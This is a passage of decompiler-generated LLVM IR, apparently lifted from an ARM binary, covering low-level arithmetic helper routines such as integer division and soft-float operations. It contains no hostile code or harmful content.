  %v1_1d3ac = phi i32 [ %v2_1d2e0, %bb ], [ %v0_1d2d4, %dec_label_pc_1d2e0 ]
  %v1_1d2e4 = add i32 %v1_1d3ac, -1
  %v7_1d2e4 = icmp eq i32 %v1_1d3ac, 1
  br i1 %v7_1d2e4, label %dec_label_pc_1d38c, label %dec_label_pc_1d2ec

dec_label_pc_1d2ec:                               ; preds = %thread-pre-split
  %v1_1d2ec = icmp slt i32 %v0_1d2d8, 0
  br i1 %v1_1d2ec, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_1d2ec
  %v2_1d2f0 = sub i32 0, %v0_1d2d8
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_1d2ec, %bb84
  %v0_1d3e0 = phi i32 [ %v0_1d2d8, %dec_label_pc_1d2ec ], [ %v2_1d2f0, %bb84 ]
  %v3_1d2f4 = icmp uge i32 %v0_1d3e0, %v1_1d3ac
  %v9_1d2f4 = icmp eq i32 %v0_1d3e0, %v1_1d3ac
  %v2_1d2f8 = xor i1 %v3_1d2f4, true
  %v3_1d2f8 = or i1 %v9_1d2f4, %v2_1d2f8
  br i1 %v3_1d2f8, label %dec_label_pc_1d398, label %dec_label_pc_1d2fc

dec_label_pc_1d2fc:                               ; preds = %bb85
  %v2_1d2fc = and i32 %v1_1d2e4, %v1_1d3ac
  %v4_1d2fc = icmp eq i32 %v2_1d2fc, 0
  br i1 %v4_1d2fc, label %dec_label_pc_1d3a8, label %dec_label_pc_1d304

dec_label_pc_1d304:                               ; preds = %dec_label_pc_1d2fc
  %v3_1d304 = icmp ult i32 %v1_1d3ac, 536870912
  br i1 %v3_1d304, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1d304
  %v4_1d308 = mul i32 %v1_1d3ac, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1d304, %.thread
  %v0_1d328.pr40.ph = phi i32 [ %v4_1d308, %.thread ], [ %v1_1d3ac, %dec_label_pc_1d304 ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1d304 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_1d328.pr40 = phi i32 [ %v4_1d31c, %bb88 ], [ %v0_1d328.pr40.ph, %.preheader.preheader ]
  %v1_1d320 = phi i32 [ %v4_1d320, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_1d314 = icmp ugt i32 %v0_1d328.pr40, 268435455
  br i1 %v2_1d314, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1d328thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_1d318 = icmp ult i32 %v0_1d328.pr40, %v0_1d3e0
  br i1 %v4_1d318, label %bb87, label %dec_label_pc_1d328thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_1d31c = and i32 %v0_1d328.pr40, 268435456
  %v3_1d31c = icmp eq i32 %v2_1d31c, 0
  %v4_1d31c = mul i32 %v0_1d328.pr40, 16
  br i1 %v3_1d31c, label %bb88, label %dec_label_pc_1d328.loopexit

bb88:                                             ; preds = %bb87
  %v2_1d320 = and i32 %v1_1d320, 268435456
  %v3_1d320 = icmp eq i32 %v2_1d320, 0
  %v4_1d320 = mul i32 %v1_1d320, 16
  br i1 %v3_1d320, label %.preheader, label %dec_label_pc_1d328thread-pre-split.loopexit.loopexit

dec_label_pc_1d328thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_1d33452.ph = phi i32 [ %v1_1d320, %bb86 ], [ %v4_1d320, %bb88 ]
  %v0_1d328.pr42.ph = phi i32 [ %v0_1d328.pr40, %bb86 ], [ %v4_1d31c, %bb88 ]
  br label %dec_label_pc_1d328thread-pre-split.loopexit

dec_label_pc_1d328thread-pre-split.loopexit:      ; preds = %dec_label_pc_1d328thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1d33452 = phi i32 [ %v1_1d320, %.thread3 ], [ %v1_1d33452.ph, %dec_label_pc_1d328thread-pre-split.loopexit.loopexit ]
  %v0_1d328.pr42 = phi i32 [ %v0_1d328.pr40, %.thread3 ], [ %v0_1d328.pr42.ph, %dec_label_pc_1d328thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1d328thread-pre-split

dec_label_pc_1d328thread-pre-split:               ; preds = %dec_label_pc_1d328thread-pre-split.loopexit, %bb90
  %v1_1d33450 = phi i32 [ %v1_1d33452, %dec_label_pc_1d328thread-pre-split.loopexit ], [ %v3_1d334, %bb90 ]
  %v2_1d32c48 = phi i32 [ %v0_1d3e0, %dec_label_pc_1d328thread-pre-split.loopexit ], [ %v2_1d32c, %bb90 ]
  %v0_1d328.pr = phi i32 [ %v0_1d328.pr42, %dec_label_pc_1d328thread-pre-split.loopexit ], [ %v3_1d330, %bb90 ]
  br label %dec_label_pc_1d328

dec_label_pc_1d328.loopexit:                      ; preds = %bb87
  br label %dec_label_pc_1d328

dec_label_pc_1d328:                               ; preds = %dec_label_pc_1d328.loopexit, %dec_label_pc_1d328thread-pre-split
  %v1_1d334 = phi i32 [ %v1_1d33450, %dec_label_pc_1d328thread-pre-split ], [ %v1_1d320, %dec_label_pc_1d328.loopexit ]
  %v2_1d32c = phi i32 [ %v2_1d32c48, %dec_label_pc_1d328thread-pre-split ], [ %v0_1d3e0, %dec_label_pc_1d328.loopexit ]
  %v1_1d330 = phi i32 [ %v0_1d328.pr, %dec_label_pc_1d328thread-pre-split ], [ %v4_1d31c, %dec_label_pc_1d328.loopexit ]
  %v2_1d328 = icmp slt i32 %v1_1d330, 0
  br i1 %v2_1d328, label %dec_label_pc_1d33c, label %bb89

bb89:                                             ; preds = %dec_label_pc_1d328
  %v4_1d32c = icmp ult i32 %v1_1d330, %v2_1d32c
  br i1 %v4_1d32c, label %bb90, label %dec_label_pc_1d33c

bb90:                                             ; preds = %bb89
  %v3_1d330 = mul i32 %v1_1d330, 2
  %v2_1d334 = icmp slt i32 %v1_1d334, 0
  %v3_1d334 = mul i32 %v1_1d334, 2
  br i1 %v2_1d334, label %dec_label_pc_1d33c, label %dec_label_pc_1d328thread-pre-split

dec_label_pc_1d33c:                               ; preds = %bb89, %dec_label_pc_1d328, %bb90
  %v2_1d34863 = phi i32 [ %v3_1d334, %bb90 ], [ %v1_1d334, %bb89 ], [ %v1_1d334, %dec_label_pc_1d328 ]
  %v1_1d34055 = phi i32 [ %v3_1d330, %bb90 ], [ %v1_1d330, %bb89 ], [ %v1_1d330, %dec_label_pc_1d328 ]
  br label %dec_label_pc_1d340

dec_label_pc_1d340:                               ; preds = %.thread13, %dec_label_pc_1d33c
  %v1_1d374 = phi i32 [ %v4_1d374, %.thread13 ], [ %v2_1d34863, %dec_label_pc_1d33c ]
  %v1_1d348 = phi i32 [ %v1_1d384, %.thread13 ], [ 0, %dec_label_pc_1d33c ]
  %v1_1d378 = phi i32 [ %v4_1d378, %.thread13 ], [ %v1_1d34055, %dec_label_pc_1d33c ]
  %v1_1d344 = phi i32 [ %v0_1d370, %.thread13 ], [ %v0_1d3e0, %dec_label_pc_1d33c ]
  %v3_1d340 = icmp ult i32 %v1_1d344, %v1_1d378
  br i1 %v3_1d340, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_1d340
  %v3_1d344 = sub i32 %v1_1d344, %v1_1d378
  %v3_1d348 = or i32 %v1_1d348, %v1_1d374
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1d340, %bb91
  %v1_1d350 = phi i32 [ %v1_1d344, %dec_label_pc_1d340 ], [ %v3_1d344, %bb91 ]
  %v1_1d354 = phi i32 [ %v1_1d348, %dec_label_pc_1d340 ], [ %v3_1d348, %bb91 ]
  %v4_1d34c = udiv i32 %v1_1d378, 2
  %v6_1d34c = icmp ult i32 %v1_1d350, %v4_1d34c
  br i1 %v6_1d34c, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_1d350 = urem i32 %v1_1d378, 2
  %v4_1d350 = icmp eq i32 %v3_1d350, 0
  %v6_1d350 = sub i32 %v1_1d350, %v4_1d34c
  br i1 %v4_1d350, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_1d354 = udiv i32 %v1_1d374, 2
  %v6_1d354 = or i32 %v1_1d354, %v5_1d354
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_1d35c = phi i32 [ %v6_1d350, %bb92 ], [ %v1_1d350, %.thread8 ], [ %v6_1d350, %bb93 ]
  %v1_1d360 = phi i32 [ %v1_1d354, %bb92 ], [ %v1_1d354, %.thread8 ], [ %v6_1d354, %bb93 ]
  %v4_1d358 = udiv i32 %v1_1d378, 4
  %v6_1d358 = icmp ult i32 %v1_1d35c, %v4_1d358
  br i1 %v6_1d358, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_1d35c = and i32 %v1_1d378, 2
  %v4_1d35c = icmp eq i32 %v3_1d35c, 0
  %v6_1d35c = sub i32 %v1_1d35c, %v4_1d358
  br i1 %v4_1d35c, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_1d360 = udiv i32 %v1_1d374, 4
  %v6_1d360 = or i32 %v1_1d360, %v5_1d360
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_1d368 = phi i32 [ %v6_1d35c, %bb94 ], [ %v1_1d35c, %.thread9 ], [ %v6_1d35c, %bb95 ]
  %v1_1d36c = phi i32 [ %v1_1d360, %bb94 ], [ %v1_1d360, %.thread9 ], [ %v6_1d360, %bb95 ]
  %v4_1d364 = udiv i32 %v1_1d378, 8
  %v6_1d364 = icmp ult i32 %v1_1d368, %v4_1d364
  br i1 %v6_1d364, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_1d368 = and i32 %v1_1d378, 4
  %v4_1d368 = icmp eq i32 %v3_1d368, 0
  %v6_1d368 = sub i32 %v1_1d368, %v4_1d364
  br i1 %v4_1d368, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_1d36c = udiv i32 %v1_1d374, 8
  %v6_1d36c = or i32 %v1_1d36c, %v5_1d36c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_1d384 = phi i32 [ %v1_1d36c, %bb96 ], [ %v1_1d36c, %.thread10 ], [ %v6_1d36c, %bb97 ]
  %v0_1d370 = phi i32 [ %v6_1d368, %bb96 ], [ %v1_1d368, %.thread10 ], [ %v6_1d368, %bb97 ]
  %v2_1d370 = icmp eq i32 %v0_1d370, 0
  br i1 %v2_1d370, label %dec_label_pc_1d380, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1d374, 16
  br i1 %tmp, label %dec_label_pc_1d380, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_1d374 = udiv i32 %v1_1d374, 16
  %v4_1d378 = udiv i32 %v1_1d378, 16
  br label %dec_label_pc_1d340

dec_label_pc_1d380:                               ; preds = %thread-pre-split12, %bb98
  %v1_1d380 = icmp slt i32 %v2_1d2d8, 0
  br i1 %v1_1d380, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_1d380
  %v2_1d384 = sub i32 0, %v1_1d384
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_1d38c, %dec_label_pc_1d380, %bb99
  %v1_1d388 = phi i32 [ %v1_1d384, %dec_label_pc_1d380 ], [ %v2_1d384, %bb99 ], [ %v2_1d390, %bb100 ], [ undef, %dec_label_pc_1d38c ], [ %v1_1d3a480, %bb102 ], [ %v2_1d3a0, %bb103 ]
  ret i32 %v1_1d388

dec_label_pc_1d38c:                               ; preds = %thread-pre-split
  br i1 %v1_1d2d4, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1d38c
  %v2_1d390 = sub i32 0, %v0_1d2d8
  br label %.thread16

dec_label_pc_1d398:                               ; preds = %bb85
  br i1 %v3_1d2f4, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_1d398
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_1d398, %bb101
  %v1_1d3a480 = phi i32 [ %v0_1d2d8, %dec_label_pc_1d398 ], [ 0, %bb101 ]
  br i1 %v9_1d2f4, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_1d39c = ashr i32 %v2_1d2d8, 31
  %v2_1d3a0 = or i32 %v4_1d39c, 1
  br label %.thread16

dec_label_pc_1d3a8:                               ; preds = %dec_label_pc_1d2fc
  %v2_1d3a8 = icmp ugt i32 %v1_1d3ac, 65535
  br i1 %v2_1d3a8, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_1d3a8
  %v2_1d3ac = and i32 %v1_1d3ac, 32768
  %v3_1d3ac = icmp eq i32 %v2_1d3ac, 0
  %v4_1d3ac = udiv i32 %v1_1d3ac, 65536
  br i1 %v3_1d3ac, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_1d3a8
  %v0_1d3b870 = phi i32 [ %v1_1d3ac, %dec_label_pc_1d3a8 ], [ %v4_1d3ac, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_1d3bc = phi i32 [ %v0_1d3b870, %.thread19 ], [ %v4_1d3ac, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_1d3b8 = icmp ugt i32 %v1_1d3bc, 255
  br i1 %v2_1d3b8, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_1d3bc = and i32 %v1_1d3bc, 128
  %v3_1d3bc = icmp eq i32 %v2_1d3bc, 0
  %v4_1d3bc = udiv i32 %v1_1d3bc, 256
  br i1 %v3_1d3bc, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_1d3c0 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_1d3cc = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_1d3c0, %bb107 ]
  %v1_1d3c8 = phi i32 [ %v1_1d3bc, %bb105 ], [ %v4_1d3bc, %bb106 ], [ %v4_1d3bc, %bb107 ]
  %v2_1d3c4 = icmp ugt i32 %v1_1d3c8, 15
  br i1 %v2_1d3c4, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_1d3c8 = and i32 %v1_1d3c8, 8
  %v3_1d3c8 = icmp eq i32 %v2_1d3c8, 0
  %v4_1d3c8 = udiv i32 %v1_1d3c8, 16
  br i1 %v3_1d3c8, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_1d3cc = add nsw i32 %v1_1d3cc, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_1d3d4 = phi i32 [ %v1_1d3cc, %.thread20 ], [ %v1_1d3cc, %bb108 ], [ %v2_1d3cc, %bb109 ]
  %v5_1d3d8 = phi i32 [ %v1_1d3c8, %.thread20 ], [ %v4_1d3c8, %bb108 ], [ %v4_1d3c8, %bb109 ]
  %v2_1d3d0 = icmp ugt i32 %v5_1d3d8, 3
  %v7_1d3d0 = icmp eq i32 %v5_1d3d8, 4
  %v2_1d3d4 = xor i1 %v7_1d3d0, true
  %v3_1d3d4 = and i1 %v2_1d3d0, %v2_1d3d4
  br i1 %v3_1d3d4, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_1d3d4 = add nsw i32 %v4_1d3d4, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_1d3d8 = phi i32 [ %v4_1d3d4, %.thread21 ], [ %v5_1d3d4, %bb110 ]
  %v2_1d3d8 = xor i1 %v2_1d3d0, true
  %v3_1d3d8 = or i1 %v7_1d3d0, %v2_1d3d8
  br i1 %v3_1d3d8, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_1d3d8 = udiv i32 %v5_1d3d8, 2
  %v9_1d3d8 = add i32 %v4_1d3d8, %v8_1d3d8
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_1d3e0 = phi i32 [ %v4_1d3d8, %bb111 ], [ %v9_1d3d8, %bb112 ]
  %v1_1d3dc = icmp slt i32 %v2_1d2d8, 0
  %v6_1d3e0 = lshr i32 %v0_1d3e0, %v1_1d3e0
  %v2_1d3e4 = sub i32 0, %v6_1d3e0
  %v2_1d3e4.v6_1d3e0 = select i1 %v1_1d3dc, i32 %v2_1d3e4, i32 %v6_1d3e0
  ret i32 %v2_1d3e4.v6_1d3e0

dec_label_pc_1d3ec:                               ; preds = %dec_label_pc_1d2d4
  %v0_1d3ec = load i32, i32* @lr, align 4
  %v0_1d3f0 = call i32 @function_1252c()
  store i32 %v0_1d3ec, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1d3d8, { 1, 0 }
  uselistorder i1 %v7_1d3d0, { 1, 0 }
  uselistorder i32 %v4_1d3c8, { 1, 0 }
  uselistorder i32 %v1_1d3c8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d3bc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1d3bc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d3ac, { 1, 0 }
  uselistorder i32 %v0_1d370, { 1, 0 }
  uselistorder i32 %v4_1d364, { 1, 0 }
  uselistorder i32 %v1_1d36c, { 1, 2, 0 }
  uselistorder i32 %v4_1d358, { 1, 0 }
  uselistorder i32 %v1_1d360, { 1, 2, 0 }
  uselistorder i32 %v4_1d34c, { 1, 0 }
  uselistorder i32 %v1_1d354, { 1, 2, 0 }
  uselistorder i32 %v1_1d378, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1d348, { 1, 0 }
  uselistorder i32 %v1_1d374, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1d334, { 1, 0 }
  uselistorder i32 %v3_1d330, { 1, 0 }
  uselistorder i32 %v1_1d330, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1d32c, { 1, 0 }
  uselistorder i32 %v1_1d334, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1d320, { 1, 0 }
  uselistorder i32 %v4_1d31c, { 2, 1, 0 }
  uselistorder i32 %v1_1d320, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1d328.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1d2f4, { 1, 0 }
  uselistorder i32 %v1_1d3ac, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1d2d8, { 1, 0, 2 }
  uselistorder i32 %v0_1d2d8, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_1d2d4, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_1252c, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1d380, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1d33c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d328thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_1d400(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1d400:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1d404 = call i32 @function_1d2d4()
  ret i32 %v0_1d404

; uselistorder directives
  uselistorder i32 ()* @function_1d2d4, { 1, 0, 2 }
}

define i32 @function_1d418(i32 %arg1) local_unnamed_addr {
dec_label_pc_1d418:
  %v1_1d418 = sub i32 0, %arg1
  store i32 %v1_1d418, i32* @r1, align 4
  %v0_1d41c = call i32 @function_1d424()
  ret i32 %v0_1d41c
}

define i32 @function_1d420(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1d420:
  %v2_1d420 = load i32, i32* @r0, align 4
  ret i32 %v2_1d420
}

define i32 @function_1d424() local_unnamed_addr {
dec_label_pc_1d424:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1d424 = load i32, i32* @r4, align 4
  store i32 %v3_1d424, i32* %stack_var_-12, align 4
  %v6_1d424 = load i32, i32* @r5, align 4
  %v9_1d424 = load i32, i32* @lr, align 4
  %v0_1d428 = load i32, i32* @r1, align 4
  %v2_1d428 = mul i32 %v0_1d428, 2
  store i32 %v2_1d428, i32* %r4.global-to-local, align 4
  %v0_1d42c = load i32, i32* @r3, align 4
  %v2_1d42c = mul i32 %v0_1d42c, 2
  store i32 %v2_1d42c, i32* %r5.global-to-local, align 4
  %v4_1d430 = icmp eq i32 %v2_1d42c, %v2_1d428
  %v1_1d434 = load i32, i32* @r0, align 4
  br i1 %v4_1d430, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1d424
  %v2_1d434 = load i32, i32* @r2, align 4
  %v5_1d434 = icmp eq i32 %v2_1d434, %v1_1d434
  br i1 %v5_1d434, label %.thread3, label %.thread

.thread:                                          ; preds = %dec_label_pc_1d424, %bb
  %v3_1d438 = or i32 %v1_1d434, %v2_1d428
  %v5_1d438 = icmp eq i32 %v3_1d438, 0
  br i1 %v5_1d438, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1d43c = load i32, i32* @r2, align 4
  %v3_1d43c = or i32 %v2_1d43c, %v2_1d42c
  %v5_1d43c = icmp eq i32 %v3_1d43c, 0
  br i1 %v5_1d43c, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1d428.off = add i32 %v2_1d428, 4194303
  %tmp = icmp ult i32 %v2_1d428.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1d42c.off = add i32 %v2_1d42c, 4194303
  %tmp17 = icmp ult i32 %v2_1d42c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1d448 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1d448, i32 ptrtoint (i32* @global_var_1d680.1160 to i32))
  %v0_1d44c = load i32, i32* %r4.global-to-local, align 4
  %v3_1d44c = udiv i32 %v0_1d44c, 2097152
  store i32 %v3_1d44c, i32* %r4.global-to-local, align 4
  %v1_1d450 = load i32, i32* %r5.global-to-local, align 4
  %v4_1d450 = udiv i32 %v1_1d450, 2097152
  %v5_1d450 = sub nsw i32 %v4_1d450, %v3_1d44c
  %v5_1d454 = icmp ult i32 %v4_1d450, %v3_1d44c
  br i1 %v5_1d454, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1d454 = sub nsw i32 0, %v5_1d450
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1d454, %bb13 ], [ %v5_1d450, %.thread3 ]
  %v0_1d478 = phi i32 [ %v7_1d454, %bb13 ], [ %v5_1d450, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1d458 = icmp ugt i32 %v4_1d450, %v3_1d44c
  br i1 %v7_1d458, label %dec_label_pc_1d45c, label %dec_label_pc_1d478

dec_label_pc_1d45c:                               ; preds = %bb14
  %v2_1d45c = add nsw i32 %v0_1d478, %v3_1d44c
  store i32 %v2_1d45c, i32* %r4.global-to-local, align 4
  %v0_1d460 = load i32, i32* @r0, align 4
  %v1_1d460 = load i32, i32* @r2, align 4
  %v0_1d464 = load i32, i32* @r1, align 4
  %v1_1d464 = load i32, i32* @r3, align 4
  store i32 %v1_1d460, i32* @r0, align 4
  store i32 %v1_1d464, i32* @r1, align 4
  store i32 %v0_1d460, i32* @r2, align 4
  store i32 %v0_1d464, i32* @r3, align 4
  br label %dec_label_pc_1d478

dec_label_pc_1d478:                               ; preds = %bb14, %dec_label_pc_1d45c
  %tmp18 = icmp ugt i32 %v0_1d478, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1d478
  %v6_1d47c = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1d47c, i32* %r4.global-to-local, align 4
  store i32 %v6_1d424, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1d478, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1d424)
  %v0_1d484 = load i32, i32* @r1, align 4
  %v3_1d484 = icmp sgt i32 %v0_1d484, -1
  br i1 %v3_1d484, label %dec_label_pc_1d4a0, label %dec_label_pc_1d498

dec_label_pc_1d498:                               ; preds = %bb16
  %v0_1d498 = load i32, i32* @r0, align 4
  %v1_1d498 = sub i32 0, %v0_1d498
  store i32 %v1_1d498, i32* @r0, align 4
  br label %dec_label_pc_1d4a0

dec_label_pc_1d4a0:                               ; preds = %bb16, %dec_label_pc_1d498
  %v0_1d4a0 = load i32, i32* @r3, align 4
  %v3_1d4a0 = icmp sgt i32 %v0_1d4a0, -1
  br i1 %v3_1d4a0, label %dec_label_pc_1d4b8, label %dec_label_pc_1d4b0

dec_label_pc_1d4b0:                               ; preds = %dec_label_pc_1d4a0
  br label %dec_label_pc_1d4b8

dec_label_pc_1d4b8:                               ; preds = %dec_label_pc_1d4a0, %dec_label_pc_1d4b0
  %v0_1d4b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d4b8 = load i32, i32* %r5.global-to-local, align 4
  %v4_1d4b8 = icmp eq i32 %v1_1d4b8, %v0_1d4b8
  call void @__pseudo_cond_branch(i1 %v4_1d4b8, i32 ptrtoint (i32* @global_var_1d668.1161 to i32))
  %v1_1d4bc = load i32, i32* @r0, align 4
  ret i32 %v1_1d4bc

; uselistorder directives
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1d450, { 2, 1, 0 }
  uselistorder i32 %v3_1d44c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1d434, { 1, 0 }
  uselistorder i32 %v2_1d42c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1d428, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1d4b8, { 1, 0 }
  uselistorder label %dec_label_pc_1d4a0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1d478, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1d4c0() local_unnamed_addr {
dec_label_pc_1d4c0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1d4c0 = load i32, i32* @r4, align 4
  %v1_1d4c0 = add i32 %v0_1d4c0, -1
  store i32 %v1_1d4c0, i32* @r4, align 4
  %v0_1d4c4 = load i32, i32* @r5, align 4
  %v1_1d4c4 = sub i32 32, %v0_1d4c4
  store i32 %v1_1d4c4, i32* @lr, align 4
  %v5_1d4c8 = icmp sgt i32 %v0_1d4c4, 32
  br i1 %v5_1d4c8, label %dec_label_pc_1d4e4, label %dec_label_pc_1d4cc

dec_label_pc_1d4cc:                               ; preds = %dec_label_pc_1d4c0
  %v0_1d4cc = load i32, i32* @r2, align 4
  %v6_1d4cc = shl i32 %v0_1d4cc, %v1_1d4c4
  store i32 %v6_1d4cc, i32* %ip.global-to-local, align 4
  %v0_1d4d0 = load i32, i32* @r0, align 4
  %v3_1d4d0 = add i32 %v0_1d4c4, -1
  %v4_1d4d0 = shl i32 1, %v3_1d4d0
  %v7_1d4d0 = lshr i32 %v0_1d4cc, %v0_1d4c4
  %v8_1d4d0 = add i32 %v0_1d4d0, %v7_1d4d0
  %v9_1d4d0 = icmp ult i32 %v8_1d4d0, %v0_1d4d0
  %v0_1d4d4 = load i32, i32* @r1, align 4
  %v2_1d4d4 = zext i1 %v9_1d4d0 to i32
  %v3_1d4d4 = add i32 %v2_1d4d4, %v0_1d4d4
  %v1_1d4d8 = load i32, i32* @r3, align 4
  %v7_1d4d8 = shl i32 %v1_1d4d8, %v1_1d4c4
  %v8_1d4d8 = add i32 %v7_1d4d8, %v8_1d4d0
  store i32 %v8_1d4d8, i32* %r0.global-to-local, align 4
  %v5_1d4dc = and i32 %v1_1d4d8, %v4_1d4d0
  %v6_1d4dc = icmp ne i32 %v5_1d4dc, 0
  %v7_1d4dc = ashr i32 %v1_1d4d8, %v0_1d4c4
  %v9_1d4dc = add i32 %v3_1d4d4, %v7_1d4dc
  %v10_1d4dc = zext i1 %v6_1d4dc to i32
  %v11_1d4dc = add i32 %v10_1d4dc, %v9_1d4dc
  br label %dec_label_pc_1d500

dec_label_pc_1d4e4:                               ; preds = %dec_label_pc_1d4c0
  %v1_1d4e4 = add i32 %v0_1d4c4, -32
